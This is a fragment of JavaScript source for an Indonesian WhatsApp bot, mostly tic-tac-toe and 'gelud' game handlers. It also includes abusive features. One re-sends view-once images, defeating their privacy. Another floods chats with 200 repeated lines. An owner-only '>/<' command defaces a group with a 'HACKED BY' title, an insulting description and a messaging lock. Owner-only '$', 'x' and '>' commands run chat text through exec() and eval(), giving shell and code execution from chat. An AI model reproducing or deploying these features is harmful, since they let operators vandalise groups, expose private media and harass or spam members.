typenya["caption"] = `*──「 ANTIVIEWONCE 」──*\n\n*༺ Waktu :* ${timeWib}\n*༺ Type :* Image\n*༺ Caption :* ${(typenya.caption === '') ? '-' : typenya.caption}\n*༺ Tanggal :* ${calender}\n\n_*SEKALIAN SEND VIRTEX BANG AOKAKAOAKA✨*_`
            
let peq = msg.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } } :  { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } }
            
let pe = await pemuda.prepareMessageFromContent(from, msg.message.viewOnceMessage.message, {quoted: peq})
            
await pemuda.relayWAMessage(pe)
}
if (budy.length > 2000) {
pemuda.sendMessage(from, `*──「 ANTIVIRTEX 」──*`, text, {quoted: fgif})
pemuda.sendMessage(from, '*Tandai Telah Dibaca!!*\n'.repeat(200), text)
}      
            
if (fs.existsSync(`./media/${from}.json`)) {
gelutSkuy = setGelud(`${from}`)
if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
if (gelutSkuy.status) return freply(`Game telah dimulai sebelumnya!`)
gelutSkuy.status = true
rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
winR = rand0m[Math.floor(Math.random() * rand0m.length)]
fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
pemuda.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
fs.unlinkSync("./media/" + from + ".json");
} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
pemuda.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: mek, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
fs.unlinkSync("./media/" + from + ".json");
}
}
if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}`
pemuda.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
pemuda.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return freply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return freply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return freply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
pemuda.sendMessage(from, ucapan1, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
freply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
pemuda.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return freply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return freply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return freply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
pemuda.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
freply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
pemuda.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (budy.startsWith('>/<')){
if (!mek.key.fromMe && !isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
anu = fs.readFileSync('media/image/hack.jpeg')
pemuda.updateProfilePicture(from, anu)
pemuda.groupUpdateSubject(from, `HACKED BY Chandra `)
pemuda.groupUpdateDescription(from, `Lah Goblok🖕🏻`)
pemuda.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
freply('Ngentod')
}, 2000)
}
if (bad.includes(messagesD)) {       
res = pemuda.prepareMessageFromContent(from,{
"liveLocationMessage": {
"degreesLatitude": -6.2357947,
"degreesLongitude": 106.8720533,
"caption": "TOXIC? SINI KE ARAB.!",
"sequenceNumber": "1634600137639001",
"jpegThumbnail": fs.readFileSync('./media/image/fake_1.jpeg')}},{quoted: floc})
pemuda.relayWAMessage(res)
}               
const listTag = [`${ownerName}@s.whatsapp.net`]
const partiNum = (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.contextInfo.participant : ''
if (listTag.includes(partiNum)) {
sendNye = fs.readFileSync('media/sticker/jantag.webp')
pemuda.sendMessage(from, sendNye, sticker, {quoted: fgif, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
if (budy.includes(`@${ownerName}`)) {
sendNye = fs.readFileSync('media/sticker/jantag.webp')
pemuda.sendMessage(from, sendNye, sticker, {quoted: fgif, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('x')){
if (!mek.key.fromMe && !isOwner) return
try {
return pemuda.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted:mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('>')){
if (!mek.key.fromMe && !isOwner) return
try {
return pemuda.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) { 
console.log('Message : %s', color(e, 'green'))    
}
}
}
